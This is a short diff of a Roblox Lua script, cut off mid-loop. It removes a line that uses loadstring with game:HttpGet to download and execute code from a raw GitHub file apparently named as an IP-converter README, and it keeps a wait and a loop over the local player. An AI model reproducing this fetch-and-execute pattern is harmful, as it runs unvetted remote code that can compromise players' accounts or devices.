@@ -1,4 +1,3 @@
-loadstring(game:HttpGet('https://raw.githubusercontent.com/42069RATIOXD/Cringe-to-ip-converter/main/README.md', true))()
 wait(80)
 for i = 1,100 do
 local Player = game.Players.LocalPlayer    
